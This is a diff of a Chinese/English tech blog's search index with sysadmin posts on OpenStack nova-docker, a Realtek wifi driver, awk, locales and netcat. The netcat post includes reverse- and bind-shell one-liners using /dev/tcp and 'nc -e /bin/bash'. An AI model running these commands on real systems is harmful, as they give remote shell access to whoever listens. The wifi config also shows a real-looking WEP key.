+<p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/</a></p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[Installing Realtek rltwifi driver for Ubuntu 14.10]]></title>
       <url>http://feisky.xyz/2015/02/14/installing-realtek-rltwifi-driver-for-ubuntu-1410/</url>
       <content type="html"><![CDATA[<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>Ubuntu 14默认内核版本没有带RTL8192ee的网卡驱动，因而就无法通过无线网络联网，并且Reltek官方网站也没有提供合适的驱动。而最新的Linux内核已经带了相应驱动，所以一般建议修复的方法就是升级内核版本到最新。但如果不想内核升级咋办呢？幸好Github上已经有人将这个驱动写好了，直接安装即可：</p>
@@ -2904,78 +2904,6 @@ From the host try to ping the guest. With the virtual machine configuration desc
 <p>附注：对应wep类型的网络配置为</p>
 <figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">#/etc/network/interfaces</div><div class="line">auto wlan0</div><div class="line">iface wlan0 inet static</div><div class="line">wireless-essid TP08129</div><div class="line">wireless_keymode restricted</div><div class="line">wireless-<span class="type">key</span> <span class="number">0812992180</span></div><div class="line">address <span class="number">192.168</span><span class="number">.1</span><span class="number">.60</span></div><div class="line">netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></div><div class="line">gateway <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></div><div class="line">broadcast <span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span></div></pre></td></tr></table></figure>
 ]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Installing nova docker on OpenStack Juno]]></title>
-      <url>http://feisky.xyz/2015/02/12/installing-nova-docker-on-openstack-juno/</url>
-      <content type="html"><![CDATA[<p>This post comes about indirectly by a request on IRC in #rdo for help getting nova-docker installed on Fedora 21. I ran through the process from start to finish and decided to write everything down for posterity.</p>
-<p>Getting started<br>I started with the Fedora 21 Cloud Image, because I’m installing onto OpenStack and the cloud images include some features that are useful in this environment.</p>
-<p>We’ll be using OpenStack packages from the RDO Juno repository. Because there is often some skew between the RDO packages and the current Fedora selinux policy, we’re going to start by putting SELinux into permissive mode (sorry, Dan):</p>
-<pre><code># setenforce 0
-# sed -i &#39;/^SELINUX=/ s/=.*/=permissive/&#39; /etc/selinux/config
-</code></pre><p>Next, install the RDO Juno repository:</p>
-<pre><code># yum -y install \
-</code></pre><p>  <a href="https://repos.fedorapeople.org/repos/openstack/openstack-juno/rdo-release-juno-1.noarch.rpm" target="_blank" rel="external">https://repos.fedorapeople.org/repos/openstack/openstack-juno/rdo-release-juno-1.noarch.rpm</a><br>And upgrade all our existing packages:</p>
-<pre><code># yum -y upgrade
-</code></pre><p>Install OpenStack<br>We’ll be using packstack to install OpenStack onto this host. Start by installing the package:</p>
-<pre><code># yum -y install openstack-packstack
-</code></pre><p>And then run a —allinone install, which sets up all OpenStack services on a single host:</p>
-<pre><code># packstack --allinone
-</code></pre><p>Install nova-docker prequisites<br>Once packstack has completed successfully, we need to install some prerequisites for nova-docker.</p>
-<pre><code># yum -y install git python-pip python-pbr \
-</code></pre><p>  docker-io fedora-repos-rawhide<br>The fedora-repos-rawhide package provides a yum configuration for the rawhide repository (disabled by default). We’re going to need that to pick up more recent versions of systemd (because of this bug) and python-six (because nova-docker needs the six.add_metaclass method):</p>
-<pre><code># yum --enablerepo=rawhide install python-six systemd
-</code></pre><p>At this point, having upgraded systemd, you should probably reboot:</p>
-<pre><code># reboot
-</code></pre><p>Configure Docker<br>Once things are up and running, we will expect the nova-compute service to launch Docker containers. In order for this to work, the nova user will need access to the Docker socket, /var/run/docker.sock. By default, this is owned by root:root and has mode 660:</p>
-<pre><code># ls -l /var/run/docker.sock
-</code></pre><p>srw-rw——. 1 root root 0 Feb  1 12:43 /var/run/docker.sock<br>The nova-compute service runs as the nova user and will not have access to that socket. There are a few ways of resolving this; an expedient method is simply to make this socket owned by the nova group, which we can do with docker’s -G option.</p>
-<p>Edit /etc/sysconfig/docker, and modify the OPTIONS= line to look like:</p>
-<p>OPTIONS=’—selinux-enabled -G nova’<br>Then enable and start the docker service:</p>
-<pre><code># systemctl enable docker
-# systemctl start docker
-</code></pre><p>Install nova-docker<br>Clone the nova-docker repository:</p>
-<pre><code># git clone http://github.com/stackforge/nova-docker.git
-# cd nova-docker
-</code></pre><p>And check out the stable/juno branch, since we’re operating with an OpenStack Juno environment:</p>
-<pre><code># git checkout stable/juno
-</code></pre><p>Now install the driver:</p>
-<pre><code># python setup.py install
-</code></pre><p>Configure Nova<br>Following the README from nova-docker, we need to modify the Nova configuration to use the nova-docker driver. Edit /etc/nova/nova.conf and add the following line to the DEFAULT section:</p>
-<p>compute_driver=novadocker.virt.docker.DockerDriver<br>If there is already a line setting compute_driver, then comment it out or delete before adding the new one.</p>
-<p>Modify the Glance configuration to permit storage of Docker images. Edit /etc/glance/glance-api.conf, and add the following line to the DEFAULT section:</p>
-<p>container_formats=ami,ari,aki,bare,ovf,ova,docker<br>Next, we need to augment the rootwrap configuration such that nova-docker is able run the ln command with root privileges. We’ll install the docker.filters file from the nova-docker source:</p>
-<pre><code># mkdir -p /etc/nova/rootwrap.d
-# cp etc/nova/rootwrap.d/docker.filters \
-</code></pre><p>  /etc/nova/rootwrap.d/docker.filters<br>We’ve changed a number of configuration files, so we should restart the affected services:</p>
-<pre><code># openstack-service restart nova glance
-</code></pre><p>Testing things out<br>Let’s try starting a container! We need to select one that will run in the nova-docker environment. Generally, that means one that does not expect to have an interactive terminal and that will automatically start some sort of web-accessible service. I have a minimal thttpd container that fits the bill nicely:</p>
-<pre><code># docker pull larsks/thttpd
-</code></pre><p>We need to store this image into Glance using the same name:</p>
-<pre><code># docker save larsks/thttpd |
-</code></pre><p>  glance image-create —name larsks/thttpd \<br>  —container-format docker —disk-format raw —is-public true<br>And now we should be able to start a container:</p>
-<pre><code># nova boot --image larsks/thttpd --flavor m1.tiny test0
-</code></pre><p>After a bit, nova list should show:</p>
-<p>+———…+———-+————+…+—————————+<br>| ID   …| Name  | Status |…| Networks         |<br>+———…+———-+————+…+—————————+<br>| 430a1…| test0 | ACTIVE |…| private=10.0.0.6 |<br>+———…+———-+————+…+—————————+<br>And we should also see the container if we run docker ps:</p>
-<pre><code># docker ps
-</code></pre><p>CONTAINER ID        IMAGE                  COMMAND                CREATED             STATUS              PORTS               NAMES<br>ee864da30cf1        larsks/thttpd:latest   “/thttpd -D -l /dev/   7 hours ago         Up 7 hours                              nova-430a197e-a0ca-4e72-a7db-1969d0773cf7<br>Getting connected<br>At this point, the container will not be network accessible; it’s attached to a private tenant network. Let’s assign it a floating ip address:</p>
-<pre><code># nova floating-ip-create public
-</code></pre><p>+———————+—————-+—————+————+<br>| Ip           | Server Id | Fixed Ip | Pool   |<br>+———————+—————-+—————+————+<br>| 172.24.4.229 | -         | -        | public |<br>+———————+—————-+—————+————+</p>
-<pre><code># nova floating-ip-associate test0 172.24.4.229
-</code></pre><p>This isn’t going to be immediately accessible because Packstack left us without a route to the floating ip network. We can fix that temporarily like this:</p>
-<pre><code># ip addr add 172.24.4.225/28 dev br-ex
-</code></pre><p>And now we can ping our Docker container:</p>
-<pre><code># ping -c2 172.24.4.229
-</code></pre><p>PING 172.24.4.229 (172.24.4.229) 56(84) bytes of data.<br>64 bytes from 172.24.4.229: icmp_seq=1 ttl=63 time=0.291 ms<br>64 bytes from 172.24.4.229: icmp_seq=2 ttl=63 time=0.074 ms</p>
-<p>—- 172.24.4.229 ping statistics —-<br>2 packets transmitted, 2 received, 0% packet loss, time 1000ms<br>rtt min/avg/max/mdev = 0.074/0.182/0.291/0.109 ms<br>And access the webserver:</p>
-<pre><code>    # curl http://172.24.4.229
-
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;Your web server is working&lt;/title&gt;
-</code></pre>]]></content>
     </entry>
     
     <entry>
@@ -3125,7 +3053,7 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 <li>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]<ul>
 <li># 提交指定容器为镜像</li>
-<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x68;&#97;&#x6e;&#x6e;&#x69;&#98;&#x61;&#x6c;&#64;&#x61;&#45;&#116;&#101;&#x61;&#x6d;&#46;&#99;&#x6f;&#109;">&#x68;&#97;&#x6e;&#x6e;&#x69;&#98;&#x61;&#x6c;&#64;&#x61;&#45;&#116;&#101;&#x61;&#x6d;&#46;&#99;&#x6f;&#109;</a>“)</li>
+<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#104;&#x61;&#x6e;&#x6e;&#105;&#x62;&#97;&#108;&#x40;&#x61;&#45;&#116;&#101;&#x61;&#x6d;&#46;&#x63;&#x6f;&#x6d;">&#104;&#x61;&#x6e;&#x6e;&#105;&#x62;&#97;&#108;&#x40;&#x61;&#45;&#116;&#101;&#x61;&#x6d;&#46;&#x63;&#x6f;&#x6d;</a>“)</li>
 <li>-m, —message=””    Commit message</li>
 <li>-p, —pause=true    Pause container during commit<ul>
 <li># 默认 commit 是暂停状态</li>
@@ -3547,6 +3475,101 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
+      <title><![CDATA[Installing nova docker on OpenStack Juno]]></title>
+      <url>http://feisky.xyz/2015/02/12/installing-nova-docker-on-openstack-juno/</url>
+      <content type="html"><![CDATA[<p>This post comes about indirectly by a request on IRC in #rdo for help getting nova-docker installed on Fedora 21. I ran through the process from start to finish and decided to write everything down for posterity.</p>
+<p>Getting started<br>I started with the Fedora 21 Cloud Image, because I’m installing onto OpenStack and the cloud images include some features that are useful in this environment.</p>
+<p>We’ll be using OpenStack packages from the RDO Juno repository. Because there is often some skew between the RDO packages and the current Fedora selinux policy, we’re going to start by putting SELinux into permissive mode (sorry, Dan):</p>
+<pre><code># setenforce 0
+# sed -i &#39;/^SELINUX=/ s/=.*/=permissive/&#39; /etc/selinux/config
+</code></pre><p>Next, install the RDO Juno repository:</p>
+<pre><code># yum -y install \
+</code></pre><p>  <a href="https://repos.fedorapeople.org/repos/openstack/openstack-juno/rdo-release-juno-1.noarch.rpm" target="_blank" rel="external">https://repos.fedorapeople.org/repos/openstack/openstack-juno/rdo-release-juno-1.noarch.rpm</a><br>And upgrade all our existing packages:</p>
+<pre><code># yum -y upgrade
+</code></pre><p>Install OpenStack<br>We’ll be using packstack to install OpenStack onto this host. Start by installing the package:</p>
+<pre><code># yum -y install openstack-packstack
+</code></pre><p>And then run a —allinone install, which sets up all OpenStack services on a single host:</p>
+<pre><code># packstack --allinone
+</code></pre><p>Install nova-docker prequisites<br>Once packstack has completed successfully, we need to install some prerequisites for nova-docker.</p>
+<pre><code># yum -y install git python-pip python-pbr \
+</code></pre><p>  docker-io fedora-repos-rawhide<br>The fedora-repos-rawhide package provides a yum configuration for the rawhide repository (disabled by default). We’re going to need that to pick up more recent versions of systemd (because of this bug) and python-six (because nova-docker needs the six.add_metaclass method):</p>
+<pre><code># yum --enablerepo=rawhide install python-six systemd
+</code></pre><p>At this point, having upgraded systemd, you should probably reboot:</p>
+<pre><code># reboot
+</code></pre><p>Configure Docker<br>Once things are up and running, we will expect the nova-compute service to launch Docker containers. In order for this to work, the nova user will need access to the Docker socket, /var/run/docker.sock. By default, this is owned by root:root and has mode 660:</p>
+<pre><code># ls -l /var/run/docker.sock
+</code></pre><p>srw-rw——. 1 root root 0 Feb  1 12:43 /var/run/docker.sock<br>The nova-compute service runs as the nova user and will not have access to that socket. There are a few ways of resolving this; an expedient method is simply to make this socket owned by the nova group, which we can do with docker’s -G option.</p>
+<p>Edit /etc/sysconfig/docker, and modify the OPTIONS= line to look like:</p>
+<p>OPTIONS=’—selinux-enabled -G nova’<br>Then enable and start the docker service:</p>
+<pre><code># systemctl enable docker
+# systemctl start docker
+</code></pre><p>Install nova-docker<br>Clone the nova-docker repository:</p>
+<pre><code># git clone http://github.com/stackforge/nova-docker.git
+# cd nova-docker
+</code></pre><p>And check out the stable/juno branch, since we’re operating with an OpenStack Juno environment:</p>
+<pre><code># git checkout stable/juno
+</code></pre><p>Now install the driver:</p>
+<pre><code># python setup.py install
+</code></pre><p>Configure Nova<br>Following the README from nova-docker, we need to modify the Nova configuration to use the nova-docker driver. Edit /etc/nova/nova.conf and add the following line to the DEFAULT section:</p>
+<p>compute_driver=novadocker.virt.docker.DockerDriver<br>If there is already a line setting compute_driver, then comment it out or delete before adding the new one.</p>
+<p>Modify the Glance configuration to permit storage of Docker images. Edit /etc/glance/glance-api.conf, and add the following line to the DEFAULT section:</p>
+<p>container_formats=ami,ari,aki,bare,ovf,ova,docker<br>Next, we need to augment the rootwrap configuration such that nova-docker is able run the ln command with root privileges. We’ll install the docker.filters file from the nova-docker source:</p>
+<pre><code># mkdir -p /etc/nova/rootwrap.d
+# cp etc/nova/rootwrap.d/docker.filters \
+</code></pre><p>  /etc/nova/rootwrap.d/docker.filters<br>We’ve changed a number of configuration files, so we should restart the affected services:</p>
+<pre><code># openstack-service restart nova glance
+</code></pre><p>Testing things out<br>Let’s try starting a container! We need to select one that will run in the nova-docker environment. Generally, that means one that does not expect to have an interactive terminal and that will automatically start some sort of web-accessible service. I have a minimal thttpd container that fits the bill nicely:</p>
+<pre><code># docker pull larsks/thttpd
+</code></pre><p>We need to store this image into Glance using the same name:</p>
+<pre><code># docker save larsks/thttpd |
+</code></pre><p>  glance image-create —name larsks/thttpd \<br>  —container-format docker —disk-format raw —is-public true<br>And now we should be able to start a container:</p>
+<pre><code># nova boot --image larsks/thttpd --flavor m1.tiny test0
+</code></pre><p>After a bit, nova list should show:</p>
+<p>+———…+———-+————+…+—————————+<br>| ID   …| Name  | Status |…| Networks         |<br>+———…+———-+————+…+—————————+<br>| 430a1…| test0 | ACTIVE |…| private=10.0.0.6 |<br>+———…+———-+————+…+—————————+<br>And we should also see the container if we run docker ps:</p>
+<pre><code># docker ps
+</code></pre><p>CONTAINER ID        IMAGE                  COMMAND                CREATED             STATUS              PORTS               NAMES<br>ee864da30cf1        larsks/thttpd:latest   “/thttpd -D -l /dev/   7 hours ago         Up 7 hours                              nova-430a197e-a0ca-4e72-a7db-1969d0773cf7<br>Getting connected<br>At this point, the container will not be network accessible; it’s attached to a private tenant network. Let’s assign it a floating ip address:</p>
+<pre><code># nova floating-ip-create public
+</code></pre><p>+———————+—————-+—————+————+<br>| Ip           | Server Id | Fixed Ip | Pool   |<br>+———————+—————-+—————+————+<br>| 172.24.4.229 | -         | -        | public |<br>+———————+—————-+—————+————+</p>
+<pre><code># nova floating-ip-associate test0 172.24.4.229
+</code></pre><p>This isn’t going to be immediately accessible because Packstack left us without a route to the floating ip network. We can fix that temporarily like this:</p>
+<pre><code># ip addr add 172.24.4.225/28 dev br-ex
+</code></pre><p>And now we can ping our Docker container:</p>
+<pre><code># ping -c2 172.24.4.229
+</code></pre><p>PING 172.24.4.229 (172.24.4.229) 56(84) bytes of data.<br>64 bytes from 172.24.4.229: icmp_seq=1 ttl=63 time=0.291 ms<br>64 bytes from 172.24.4.229: icmp_seq=2 ttl=63 time=0.074 ms</p>
+<p>—- 172.24.4.229 ping statistics —-<br>2 packets transmitted, 2 received, 0% packet loss, time 1000ms<br>rtt min/avg/max/mdev = 0.074/0.182/0.291/0.109 ms<br>And access the webserver:</p>
+<pre><code>    # curl http://172.24.4.229
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Your web server is working&lt;/title&gt;
+</code></pre>]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Linux netcat examples]]></title>
+      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
+      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
+<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
+<p>Server: nc -l 1567 &lt; file.txt </p>
+<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
+<p>Client to Server:</p>
+<p>Server: nc -l 1567 &gt; file.txt</p>
+<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
+<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
+<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
+<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
+<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[How to use docker compose to deploy a flask app]]></title>
       <url>http://feisky.xyz/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/</url>
       <content type="html"><![CDATA[<p>The flask app is very simple, you have an index page where your can write and read comments.</p>
@@ -3772,29 +3795,6 @@ ADD static/ /www/static
 <p>Now it’s time for my questions.</p>
 <p>Do I miss something ? Or maybe I could make something better ?</p>
 <p>I like to hear your experiences about how to handle Docker orchestration !</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Linux netcat examples]]></title>
-      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
-      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
-<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567</p>
-<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
-<p>Server: nc -l 1567 &lt; file.txt </p>
-<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
-<p>Client to Server:</p>
-<p>Server: nc -l 1567 &gt; file.txt</p>
-<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
-<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
-<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
-<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
-<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
-<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
-<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
-<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
 ]]></content>
     </entry>
     
@@ -5994,31 +5994,6 @@ ADD static/ /www/static
     </entry>
     
     <entry>
-      <title><![CDATA[cannot change locale]]></title>
-      <url>http://feisky.xyz/2015/02/09/cannot-change-locale/</url>
-      <content type="html"><![CDATA[<p>运行locale命令<span id="more-912"></span><br>LANG=<br>LANGUAGE=<br>LC_CTYPE=”POSIX”<br>LC_NUMERIC=”POSIX”<br>LC_TIME=”POSIX”<br>LC_COLLATE=”POSIX”<br>LC_MONETARY=”POSIX”<br>LC_MESSAGES=”POSIX”<br>LC_PAPER=”POSIX”<br>LC_NAME=”POSIX”<br>LC_ADDRESS=”POSIX”<br>LC_TELEPHONE=”POSIX”<br>LC_MEASUREMENT=”POSIX”<br>LC_IDENTIFICATION=”POSIX”<br>LC_ALL=  </p>
-<p>修改profile</p>
-<p>vi /etc/profile</p>
-<p>添加如下内容</p>
-<p>export LC_ALL=en_US.UTF-8</p>
-<p>source /etc/profile</p>
-<p>得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory<br>&nbsp;运行 dpkg-reconfigure locales</p>
-<p>得到错误</p>
-<p>perl: warning: Setting locale failed.<br>perl: warning: Please check that your locale settings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANGUAGE = (unset),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LC_ALL = “en_US.UTF-8”,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANG = “en_US.UTF-8”<br>&nbsp;&nbsp;&nbsp; are supported and installed on your system.<br>perl: warning: Falling back to the standard locale (“C”).<br>locale: Cannot set LC_CTYPE to default locale: No such file or directory<br>locale: Cannot set LC_MESSAGES to default locale: No such file or directory<br>locale: Cannot set LC_ALL to default locale: No such file or directory<br>/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)  </p>
-<p>解决办法</p>
-<p>apt-get purge locales</p>
-<p>apt-get autoclean</p>
-<p>apt-get install locales</p>
-<p>cd /usr/share/locales</p>
-<p>./install-language-pack en_US.UTF-8</p>
-<p>dpkg-reconfigure locales</p>
-<p>修复完成</p>
-<p>运行locale</p>
-<p>LANG=en_US.UTF-8<br>LANGUAGE=<br>LC_CTYPE=”en_US.UTF-8”<br>LC_NUMERIC=”en_US.UTF-8”<br>LC_TIME=”en_US.UTF-8”<br>LC_COLLATE=”en_US.UTF-8”<br>LC_MONETARY=”en_US.UTF-8”<br>LC_MESSAGES=”en_US.UTF-8”<br>LC_PAPER=”en_US.UTF-8”<br>LC_NAME=”en_US.UTF-8”<br>LC_ADDRESS=”en_US.UTF-8”<br>LC_TELEPHONE=”en_US.UTF-8”<br>LC_MEASUREMENT=”en_US.UTF-8”<br>LC_IDENTIFICATION=”en_US.UTF-8”<br>LC_ALL=en_US.UTF-8</p>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[Perform Consistent Snapshots with qemu guest agent]]></title>
       <url>http://feisky.xyz/2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/</url>
       <content type="html"><![CDATA[<p>A while back, I <a href="http://www.sebastien-han.fr/blog/2012/12/10/openstack-perform-consistent-snapshots/" target="_blank" rel="external">wrote an article</a> about taking consistent snapshots of your virtual machines in your OpenStack environment.<br>    However this method was really intrusive since it required to be inside the virtual machine and to manually summon a filesystem freeze.<br>    In this article, I will use a different approach to achieve the same goal without the need to be inside the virtual machine.</p>
@@ -6057,6 +6032,31 @@ ADD static/ /www/static
 <p>When this option will be set and the virtual machine running the QEMU guest agent, when a user will snapshot an instance, the filesystem will get frozen and thawed after the operation.  </p>
 <pre><code>&gt; I’m really looking forward to the Kilo release now! What about you?
 </code></pre>]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[cannot change locale]]></title>
+      <url>http://feisky.xyz/2015/02/09/cannot-change-locale/</url>
+      <content type="html"><![CDATA[<p>运行locale命令<span id="more-912"></span><br>LANG=<br>LANGUAGE=<br>LC_CTYPE=”POSIX”<br>LC_NUMERIC=”POSIX”<br>LC_TIME=”POSIX”<br>LC_COLLATE=”POSIX”<br>LC_MONETARY=”POSIX”<br>LC_MESSAGES=”POSIX”<br>LC_PAPER=”POSIX”<br>LC_NAME=”POSIX”<br>LC_ADDRESS=”POSIX”<br>LC_TELEPHONE=”POSIX”<br>LC_MEASUREMENT=”POSIX”<br>LC_IDENTIFICATION=”POSIX”<br>LC_ALL=  </p>
+<p>修改profile</p>
+<p>vi /etc/profile</p>
+<p>添加如下内容</p>
+<p>export LC_ALL=en_US.UTF-8</p>
+<p>source /etc/profile</p>
+<p>得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory<br>&nbsp;运行 dpkg-reconfigure locales</p>
+<p>得到错误</p>
+<p>perl: warning: Setting locale failed.<br>perl: warning: Please check that your locale settings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANGUAGE = (unset),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LC_ALL = “en_US.UTF-8”,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANG = “en_US.UTF-8”<br>&nbsp;&nbsp;&nbsp; are supported and installed on your system.<br>perl: warning: Falling back to the standard locale (“C”).<br>locale: Cannot set LC_CTYPE to default locale: No such file or directory<br>locale: Cannot set LC_MESSAGES to default locale: No such file or directory<br>locale: Cannot set LC_ALL to default locale: No such file or directory<br>/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)  </p>
+<p>解决办法</p>
+<p>apt-get purge locales</p>
+<p>apt-get autoclean</p>
+<p>apt-get install locales</p>
+<p>cd /usr/share/locales</p>
+<p>./install-language-pack en_US.UTF-8</p>
+<p>dpkg-reconfigure locales</p>
+<p>修复完成</p>
+<p>运行locale</p>
+<p>LANG=en_US.UTF-8<br>LANGUAGE=<br>LC_CTYPE=”en_US.UTF-8”<br>LC_NUMERIC=”en_US.UTF-8”<br>LC_TIME=”en_US.UTF-8”<br>LC_COLLATE=”en_US.UTF-8”<br>LC_MONETARY=”en_US.UTF-8”<br>LC_MESSAGES=”en_US.UTF-8”<br>LC_PAPER=”en_US.UTF-8”<br>LC_NAME=”en_US.UTF-8”<br>LC_ADDRESS=”en_US.UTF-8”<br>LC_TELEPHONE=”en_US.UTF-8”<br>LC_MEASUREMENT=”en_US.UTF-8”<br>LC_IDENTIFICATION=”en_US.UTF-8”<br>LC_ALL=en_US.UTF-8</p>
+]]></content>
     </entry>
     
     <entry>
@@ -6248,6 +6248,65 @@ root@ca83bf0ea76a:/# tail -f /tmp/output.txt
     </entry>
     
     <entry>
+      <title><![CDATA[awk examples]]></title>
+      <url>http://feisky.xyz/2015/01/27/awk-examples/</url>
+      <content type="html"><![CDATA[<ul>
+<li>precede each line by line number</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print NR, $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>replace first field by line number</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;$1=NR; print&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>print field 1 and field 2</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $1,$2&#125;'</span> fielname</div></pre></td></tr></table></figure>
+<ul>
+<li>print last field </li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $NF&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>print non empty lines</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;0&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>print if more than 4 fields</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;4&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li><p>print matching lines (egrep)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'/test.*/&#123;print $0&#125;'</span>  filename</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>print lines where first field matches</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'$1 ~ /^print.*/&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>calcuting sum of field 2</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'BEGIN&#123;sum=0&#125;&#123;sum+=$2&#125;END&#123;print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>for loop</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;sum=0; for(i=1;i&lt;=NF;i++)sum+=$i; print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>make arrays</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;n = split($0, array); print array[1], array[3]&#125; '</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>reverse a file</li>
+</ul>
